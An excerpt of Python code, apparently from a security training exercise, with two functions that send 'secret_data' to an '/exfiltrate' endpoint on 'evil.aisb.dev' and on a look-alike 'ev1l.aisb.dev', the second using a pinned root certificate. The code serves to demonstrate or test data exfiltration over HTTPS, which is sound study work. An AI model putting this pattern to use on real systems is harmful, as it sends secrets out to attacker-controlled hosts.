...
def make_evil_request_https(secret_data: str) -> Optional[str]:
    ...
    try:
        ...
        data = requests.get(f"https://evil.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5)
        if data.status_code != 200:
...
def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    ...
    try:
        ...
        data = requests.get(f"https://ev1l.aisb.dev/exfiltrate", params={"data": secret_data}, verify='isrg-root-x1.pem', timeout=5)
        if data.status_code != 200:
            print(f"status code: {data.status_code}")
            return None
        else:
